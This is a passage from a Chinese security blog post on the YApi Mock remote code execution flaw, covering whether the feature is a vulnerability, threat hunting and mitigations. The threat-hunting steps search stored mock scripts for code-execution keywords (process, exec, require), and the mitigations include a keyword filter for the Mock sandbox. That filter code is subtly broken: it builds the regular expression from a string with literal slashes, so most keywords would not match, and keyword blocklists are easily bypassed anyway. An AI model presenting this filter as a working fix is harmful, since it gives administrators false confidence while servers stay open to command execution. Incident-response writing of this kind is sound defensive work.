+<p>​	作者认为这是一个正常的功能， “很多安全人员没深入开发或者是结合到sdl中，所以对这些需求的理解不深刻。那么假设我们要执行这个需求，这个需求就是要执行任意命令，因为业务会有千奇百怪的需求，前端nodejs就要执行命令来测试的。”，我虽然也是脱离业务的安全人员，但也相信确实存在各种乱七八糟的需求，执行命令也确实有它的客观需要。</p>
+<p>​	但文章作者认为这个正常的功能，不需要修复，我觉得不对。</p>
+<p>​	Mock 提供的JS脚本确实是正常的功能，但是不是真的需要给任何人都开放这个权限呢？</p>
+<p>​	我认为这是一个功能的滥用，Mock的初衷是好的，但是却容易导致被攻击者恶意利用，造成的危害是重大的。安全是一门平衡的艺术，是为了保障业务持续稳定安全的运行。这次的问题还是侧重在用户权限上，官方允许新用户登录拥有 <code>个人空间</code> 分组下的<strong>全部权限</strong>，可以在这里<strong>任意试用 YApi 的功能</strong>，这样任何人都可以运行Mock脚本，继而间接导致任何人都可以控制服务器权限，这是存在安全隐患的。</p>
+<p>​	我认为或许可以进行平衡，限制普通用户的权限，只允许可信的人来操作，对权限进行完善划分，对于可以控制服务器、执行系统命令的这些高危操作应当予以限制等。</p>
+<p>​	不过，这也这是一个脱离业务的安全人员的粗浅想法，要根据实际进行处理。</p>
+<p>​	感觉又是一个蜜罐素材？</p>
+<h2 id="0x04-威胁排查" class="heading-element"><span>0x04 威胁排查</span>
+  <a href="#0x04-%e5%a8%81%e8%83%81%e6%8e%92%e6%9f%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>1、使用管理员账号登录YAPI，在用户管理中排查并删除异常用户。</p>
+<p><img loading="lazy" src="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803425.png" alt="图片" srcset="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803425.png?size=small, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803425.png?size=medium 1.5x, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803425.png?size=large 2x" data-title="图片" style="--width: 555px;--aspect-ratio: 555 / 268;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>2、通过关键字（process、exec、require等），在adv_mock集合的mock_script域中搜索是否存在恶意的javascript脚本。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">db.adv_mock.find({mock_script: /exec/});</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803418.png" alt="图片" srcset="/posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803418.png?size=small, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803418.png?size=medium 1.5x, /posts/yapi-mock-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/resource/Yapi_Mock_RCE.assets/640-20230217124803418.png?size=large 2x" data-title="图片" style="--width: 567px;--aspect-ratio: 567 / 112;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>出自：<a href="https://mp.weixin.qq.com/s?__biz=Mzk0MjE3ODkxNg==&amp;mid=2247485888&amp;idx=1&amp;sn=3db5bf89f7f214859c0c37bf4340fa3a&amp;scene=21#wechat_redirect"target="_blank" rel="external nofollow noopener noreferrer">《【处置手册】YAPI远程代码执行0day漏洞》</a></p>
+<h2 id="0x05-缓解措施" class="heading-element"><span>0x05 缓解措施</span>
+  <a href="#0x05-%e7%bc%93%e8%a7%a3%e6%8e%aa%e6%96%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>目前官方暂未针对该漏洞发布修复方案，请受影响的用户参考下列措施进行防护：<strong>1、关闭YAPI用户注册功能</strong></p>
+<p>在 config.json 中添加以下配置项，禁止用户注册或启用LDAP认证：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"> {
+</span></span><span class="line"><span class="cl">    &#34;closeRegister&#34;:true
+</span></span><span class="line"><span class="cl"> }</span></span></code></pre></td></tr></table>
+</div>
+</div><p>修改完成后，重启 YAPI 服务生效。</p>
+<p><strong>2、关闭YAPI Mock功能</strong></p>
+<p>1)、在config.json中新增mock: false参数：  <code>{ ... &quot;mock&quot;: false, }</code></p>
+<p>2)、在<code>exts/yapi-plugin-andvanced-mock/server.js</code>文件中找到：</p>
+<p><code>if (caseData &amp;&amp;   caseData.case_enable) {...}</code></p>
+<p>并添加下列代码：</p>
+<p><code>if(!yapi.WEBCONFIG.mock) { return   false; }</code></p>
+<p><strong>3、对高级Mock功能进行关键字过滤</strong></p>
+<p>在<code>/server/utils/commons.js</code>文件中找到：</p>
+<p><code>sandbox =   yapi.commons.sandbox(sandbox, script);</code></p>
+<p>并添加下列代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"> <span class="k">const</span> <span class="n">filter</span> <span class="o">=</span> <span class="s1">&#39;/process|exec|require/g&#39;</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl"> <span class="k">const</span> <span class="n">reg</span> <span class="o">=</span> <span class="n">new</span> <span class="n">RegExp</span><span class="p">(</span><span class="n">filter</span><span class="p">,</span> <span class="s2">&#34;g&#34;</span><span class="p">);</span>   
+</span></span><span class="line"><span class="cl"> <span class="k">if</span><span class="p">(</span><span class="n">reg</span><span class="o">.</span><span class="n">test</span><span class="p">(</span><span class="n">script</span><span class="p">))</span> <span class="p">{</span> <span class="k">return</span> <span class="bp">false</span><span class="p">;</span> <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>4、对YAPI平台的访问进行限制</strong></p>
+<p>利用请求白名单的方式限制 YAPI 相关端口</p>
+<p><strong>5、修改管理员默认账号口令，清除弱口令。</strong></p>
+<p><strong>6、检查删除恶意账户</strong></p>
+<p>及时检查删除恶意账户，同步删除恶意用户创建的接口以及他们上传的恶意mock脚本以防止二次攻击。</p></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2021-07-12 00:00:00">更新于 2021-07-12&nbsp;</span>
+      </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span></span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-tag" title="标签 - 漏洞分析">漏洞分析</a><a href="/tags/vuln/" class="post-tag" title="标签 - Vuln">Vuln</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/posts/nmap%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/" class="post-nav-item" rel="prev" title="002-Nmap进阶学习心得"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>002-Nmap进阶学习心得</a><a href="/posts/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F-%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E8%84%91%E5%9B%BE/" class="post-nav-item" rel="next" title="004-内网渗透 内网信息搜集脑图">004-内网渗透 内网信息搜集脑图<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw me-1" aria-hidden="true"></i><span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/fuse/fuse.min.js" defer></script><script src="/lib/twemoji/twemoji.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":20},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"search":{"distance":100,"findAllMatches":false,"fuseIndexURL":"/search.json","highlightTag":"em","ignoreFieldNorm":false,"ignoreLocation":false,"isCaseSensitive":false,"location":0,"maxResultLength":10,"minMatchCharLength":2,"noResultsFound":"没有找到结果","snippetLength":30,"threshold":0.3,"type":"fuse","useExtendedSearch":false},"twemoji":true,"version":"v0.3.16"};console.log('Page config:', window.config);</script><script src="/js/theme.min.js" defer></script></body>
+</html>
